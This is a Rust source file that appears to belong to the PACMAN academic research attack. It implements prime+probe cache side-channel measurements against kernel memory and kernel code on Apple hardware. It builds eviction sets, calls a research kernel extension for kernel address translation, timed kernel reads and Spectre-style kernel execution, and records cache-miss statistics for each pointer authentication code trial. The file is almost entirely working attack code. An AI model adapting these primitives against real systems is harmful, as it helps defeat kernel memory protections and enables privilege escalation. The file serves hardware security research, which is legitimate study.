/*!
 * Methods for implementing the actual prime+probe attacks.
 */
use crate::*;

pub const DATA_EVSET_SIZE : usize = 21;
pub const DATA_MISS_LATENCY : u64 = 40;

/// How many times to repeat a given trial?
pub const DATA_NUM_ITERS : usize = 50;

/// How many trials to run? (Each trial == a different PAC)
pub const DATA_NUM_TRIALS : usize = 1024;

pub const INST_EVSET_SIZE : usize = 11;
pub const INST_MISS_LATENCY : u64 = 40;

/// How many times to repeat a given trial?
pub const INST_NUM_ITERS : usize = 512;

/// How many trials to run? (Each trial == a different PAC)
pub const INST_NUM_TRIALS : usize = 32;

/**
 * Data prime+probe
 * Begin by priming an eviction set, then do a load, and then
 * probe the eviction set, recording the number of misses.
 */
pub unsafe fn data_prime_probe(mem_region: &mut [u8]) {
    // -1. Setup PacmanKit
    let handle = match PacmanKitConnection::init() {
        Some(v) => v,
        None => panic!("Couldn't connect to PacmanKit"),
    };

    let mut kernel_mmap_va = match handle.kernel_mmap() {
        Ok(v) => v,
        Err(err) => panic!("Couldn't call IOMalloc in the kernel!"),
    };

    let kernel_mmap_pa = handle.kernel_virt_to_phys(kernel_mmap_va).unwrap();

    // // 0. Pick a target
    // let target = Box::new(0x41414141u64);
    // let target_vaddr = &*target as *const _ as u64;

    // // Sanity check the addressing with Box<u64>
    // let outval : u64;
    // asm!{
    //     "ldr {outval}, [{ptr}]",
    //     outval = out(reg) outval,
    //     ptr = in(reg) target_vaddr,
    // }
    // println!("0x{:X} contains 0x{:X}",target_vaddr, outval);
    // let target_paddr = handle.user_virt_to_phys(target_vaddr).unwrap();

    let target_vaddr = kernel_mmap_va;
    let target_paddr = kernel_mmap_pa;

    let mut results = [[0; DATA_NUM_ITERS]; DATA_NUM_TRIALS];
    let evset = data_pevset(target_vaddr, target_paddr, mem_region);
    let chosen_vec : Vec<u64> = evset.choose_multiple(&mut rand::thread_rng(), DATA_EVSET_SIZE).into_iter().cloned().collect();
    let indexes_vec : Vec<usize> = (0..chosen_vec.len()).collect();

    // Copy from vector to array to minimize Rust overhead
    let mut chosen = [0u64; DATA_EVSET_SIZE];
    let mut indexes = [0usize; DATA_EVSET_SIZE];

    for i in 0..DATA_EVSET_SIZE {
        chosen[i] = chosen_vec[i];
        indexes[i] = indexes_vec[i];
    }

    // Initialize eviction set
    for entry in &evset {
        timer::time_access(*entry);
    }

    for entry in &chosen {
        timer::time_access(*entry);
    }

    // Decide which trials should load and which should not
    let mut do_loads = [false; DATA_NUM_TRIALS];
    for i in 0..DATA_NUM_TRIALS {
        do_loads[i] = crandom::rand() % 2 == 0;
    }

    // Each trial tests a different PAC
    for trial in 0..DATA_NUM_TRIALS {
        let do_load = do_loads[trial];

        // Number of misses each iteration
        let mut samples = [0; DATA_NUM_ITERS];

        // Each iteration checks the same value multiple times
        for iteration in 0..DATA_NUM_ITERS {
            indexes.shuffle(&mut thread_rng());

            // 1. Prime
            for _ in 0..12 {
                for i in 0..DATA_EVSET_SIZE {
                    timer::time_access(chosen[indexes[i]]);
                }
            }

            // 2. Load(?)
            // if do_load {
            //     timer::time_access(target_vaddr);
            // }
            handle.kernel_read_for_timing(target_vaddr, do_load).unwrap();

            // 3. Probe
            let mut times = [0; DATA_EVSET_SIZE];
            for i in (0..DATA_EVSET_SIZE).rev() {
                times[i] = timer::time_access(chosen[indexes[i]]);
            }

            let mut misses = 0;
            for i in 0..DATA_EVSET_SIZE {
                if times[i] > DATA_MISS_LATENCY {
                    misses+=1;
                }
            }

            samples[iteration] = misses;
            // println!("{:?}", times);
            // println!("{} misses", misses);
        }

        results[trial] = samples;

        // println!("To evict: 0x{:X} => 0x{:X}", target_vaddr, target_paddr);

        // for i in 0..DATA_EVSET_SIZE {
        //     println!("\t0x{:X} => 0x{:X}", chosen[indexes[i]], handle.user_virt_to_phys(chosen[indexes[i]]).unwrap());
        // }
    }

    for i in 0..DATA_NUM_TRIALS {
        if do_loads[i] {
            print!("[*] ");
        }
        else {
            print!("[x] ");
        }
        results[i].sort();
        let mut avg : u64 = 0;
        for j in 0..results[i].len() {
            avg += results[i][j];
        }
        avg /= results[i].len() as u64;
        // println!("{:?}", results[i]);
        let median = results[i][results[i].len() / 2];
        println!("{}, {}", median, avg);
    }
}

/**
 * Inst prime+probe
 * Begin by priming an eviction set, then do an exec, and then
 * probe the eviction set, recording the number of misses.
 */
 pub unsafe fn inst_prime_probe(mem_region: &mut [u8]) {
    // -1. Setup PacmanKit
    let handle = match PacmanKitConnection::init() {
        Some(v) => v,
        None => panic!("Couldn't connect to PacmanKit"),
    };

    // let mut kernel_method_va = handle.leak_method().unwrap();
    let kernel_method_va = handle.get_kernel_base().unwrap() + attacks::pacman::INST_TARGET_OFFSET;

    let kernel_method_pa = handle.kernel_virt_to_phys(kernel_method_va).unwrap();

    // // 0. Pick a target
    let target_vaddr = kernel_method_va;
    let target_paddr = kernel_method_pa;

    // let train_vaddr = handle.leak_retpoline().unwrap() | PAC_BITMASK;

    let mut results = [[0; INST_NUM_ITERS]; INST_NUM_TRIALS];
    let evset = inst_pevset(target_vaddr, target_paddr, mem_region);
    let chosen_vec : Vec<u64> = evset.choose_multiple(&mut rand::thread_rng(), INST_EVSET_SIZE).into_iter().cloned().collect();
    let indexes_vec : Vec<usize> = (0..chosen_vec.len()).collect();

    // Copy from vector to array to minimize Rust overhead
    let mut chosen = [0u64; INST_EVSET_SIZE];
    let mut indexes = [0usize; INST_EVSET_SIZE];

    for i in 0..INST_EVSET_SIZE {
        chosen[i] = chosen_vec[i];
        indexes[i] = indexes_vec[i];
    }

    // Initialize eviction set
    for entry in &evset {
        timer::time_exec(*entry);
    }

    for entry in &chosen {
        timer::time_exec(*entry);
    }

    // Decide which trials should load and which should not
    let mut do_loads = [false; INST_NUM_TRIALS];
    for i in 0..INST_NUM_TRIALS {
        do_loads[i] = crandom::rand() % 2 == 0;
    }

    // Each trial tests a different PAC
    for trial in 0..INST_NUM_TRIALS {
        let do_load = do_loads[trial];

        // Number of misses each iteration
        let mut samples = [0; INST_NUM_ITERS];

        // Each iteration checks the same value multiple times
        for iteration in 0..INST_NUM_ITERS {
            indexes.shuffle(&mut thread_rng());

            // BEGIN SPECTRE STUFF
            // for _ in 0..64 {
            //     handle.kernel_exec_for_spectre(train_vaddr, 0).unwrap();
            // }
            // END SPECTRE STUFF

            // 1. Prime
            for _ in 0..12 {
                for i in 0..INST_EVSET_SIZE {
                    timer::time_exec(chosen[indexes[i]]);
                }
            }

            // 2. Call(?)
            // prime+probe only:
            // handle.kernel_exec_for_timing(target_vaddr, do_load).unwrap();

            // Spectre:
            handle.kernel_exec_for_spectre(target_vaddr, if do_load {0x0} else {0x50}).unwrap();

            // 3. Probe
            let mut times = [0; INST_EVSET_SIZE];
            for i in (0..INST_EVSET_SIZE).rev() {
                times[i] = timer::time_exec(chosen[indexes[i]]);
            }

            let mut misses = 0;
            for i in 0..INST_EVSET_SIZE {
                if times[i] > INST_MISS_LATENCY {
                    misses+=1;
                }
            }

            // println!("{:?}", times);
            samples[iteration] = misses;
        }

        results[trial] = samples;
    }

    for i in 0..INST_NUM_TRIALS {
        if do_loads[i] {
            print!("[*] ");
        }
        else {
            print!("[x] ");
        }
        results[i].sort();
        let mut avg : u64 = 0;
        for j in 0..results[i].len() {
            avg += results[i][j];
        }
        avg /= results[i].len() as u64;
        // println!("{:?}", results[i]);
        let median = results[i][results[i].len() / 2];
        println!("{}, {}", median, avg);
    }
}
